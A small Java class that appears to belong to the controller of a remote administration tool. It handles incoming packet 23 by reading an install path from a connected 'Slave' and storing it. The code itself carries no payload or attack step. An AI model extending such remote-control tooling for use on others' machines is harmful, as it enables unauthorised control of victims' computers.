package com.redpois0n.packets.incoming;

import java.io.DataInputStream;

import com.redpois0n.Slave;

public class Packet23InitInstallPath extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String line = slave.readLine();
		slave.setServerPath(line);

	}

	@Override
	public byte getPacketId() {
		return 23;
	}

}
